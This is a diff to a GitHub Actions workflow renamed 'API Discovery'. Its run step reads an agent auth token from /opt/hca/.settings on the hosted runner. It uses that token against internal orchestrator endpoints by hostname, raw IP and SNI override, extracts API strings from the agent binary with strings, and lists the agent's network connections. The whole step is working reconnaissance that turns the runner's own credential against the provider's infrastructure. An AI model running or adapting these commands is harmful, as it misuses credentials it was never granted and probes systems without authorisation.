@@ -1,4 +1,4 @@
-name: Correct Path Test
+name: API Discovery
 on:
   push:
     branches: [master]
@@ -9,39 +9,24 @@ jobs:
     steps:
       - run: |
           AUTH=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'])")
-          API="https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com"
           
-          echo "=== Test: root with auth ==="
-          curl -sk --connect-timeout 5 -H "Authorization: Bearer $AUTH" "$API/" 2>&1
+          echo "=== 1. Check IP:443 ==="
+          curl -sk --connect-timeout 5 -H "Authorization: Bearer $AUTH" "https://20.75.202.224/" 2>&1 | head -5
           echo ""
-          echo "=== Test: /v1 with auth ==="
-          curl -sk --connect-timeout 5 -H "Authorization: Bearer $AUTH" "$API/v1/" 2>&1
+          echo "=== 2. Check with SNI ==="
+          curl -sk --connect-timeout 5 --resolve "hosted-compute-request-orchestrator-prod-eus-01.githubapp.com:443:20.75.202.224" \
+            -H "Authorization: Bearer $AUTH" "https://hosted-compute-request-orchestrator-prod-eus-01.githubapp.com/" 2>&1
           echo ""
-          echo "=== Test: /twirp/... (no v1 prefix) ==="
-          curl -sk --http2 --connect-timeout 5 \
-            -H "Authorization: Bearer $AUTH" \
-            -H "Content-Type: application/json" \
-            -d '{}' \
-            "$API/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus" 2>&1
+          echo "=== 3. Check what API the binary uses ==="
+          strings /opt/hca/hosted-compute-agent 2>/dev/null | grep "githubapp\|api/v1\|twirp\|orchestrator" | grep -v "^$" | sort -u | head -20
           echo ""
-          echo "=== Test: /v1/twirp/... (with trailing v1) ==="
-          curl -sk --http2 --connect-timeout 5 \
-            -H "Authorization: Bearer $AUTH" \
-            -H "Content-Type: application/json" \
-            -d '{}' \
-            "$API/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus" 2>&1
-          echo ""
-          echo "=== Test: /v1/health ==="
-          curl -sk --connect-timeout 5 -H "Authorization: Bearer $AUTH" "$API/v1/health" 2>&1
-          echo ""
-          echo "=== Test: iad-02 with auth ==="
-          curl -sk --connect-timeout 5 -H "Authorization: Bearer $AUTH" \
-            "https://hosted-compute-request-orchestrator-prod-iad-02.githubapp.com/" 2>&1
+          echo "=== 4. Check active connections from HCA ==="
+          ss -tnp | grep hosted-compute
           echo ""
           echo "=== DONE ==="
 
       - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: path-test
+          name: api-discovery
           path: dist/
